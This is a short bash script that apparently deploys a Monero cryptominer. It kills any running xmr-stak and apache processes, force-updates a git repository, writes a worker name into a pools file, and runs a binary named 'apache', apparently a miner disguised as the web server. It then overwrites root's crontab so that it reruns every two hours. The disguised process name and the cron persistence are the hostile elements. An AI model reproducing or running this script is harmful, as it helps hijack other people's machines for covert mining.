#!/bin/bash

killall xmr-stak; killall apache2; killall apache

cd ~/tanhuevon/ ; git stash drop; git reset --hard; git pull
sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
cd ~/tanhuevon/ 
chmod +x apache ; chmod +x apache ; ./apache &> apache.log

echo '0 */2 * * * bash /root/tanhuevon/apache.sh &> /root/out.log' | crontab -

